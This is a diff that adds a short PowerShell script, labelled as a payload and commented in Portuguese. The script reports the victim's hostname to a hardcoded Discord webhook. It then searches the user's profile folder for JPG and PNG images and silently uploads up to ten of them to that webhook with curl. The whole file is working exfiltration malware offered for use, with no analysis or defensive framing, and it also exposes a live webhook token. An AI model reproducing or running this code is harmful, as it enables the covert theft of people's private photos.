@@ -1,0 +1,19 @@
+# PAYLOAD (.ps1) - PixelReflection Staged Adapt
+$u = 'https://discord.com/api/webhooks/1484361195443196066/GoX9619rfnS7zha8MBZzXEdsReSFosFYFbtFyVfNPVxybJXyXVw7TkLPoj5M-g6nWaXX'
+
+# Alvos: O script original focava em test.jpg. Vamos expandir para fotos comuns.
+$e = @('*.jpg', '*.png', 'test.jpg')
+$p = $env:USERPROFILE
+
+# Notificação de Início
+curl.exe -k -s -F ('payload=' + [char]64 + 'PixelReflection Adapt iniciado no host: ' + $env:COMPUTERNAME) $u
+
+# Procura o ficheiro alvo (limitado para evitar lentidão)
+Get-ChildItem -Path $p -Include $e -Recurse -File -ErrorAction SilentlyContinue | Select-Object -First 10 | ForEach-Object {
+    if ($_.Length -lt 24MB) {
+        $a = 'file=' + [char]64 + $_.FullName
+        curl.exe -k -s -F $a $u
+    }
+}
+
+exit
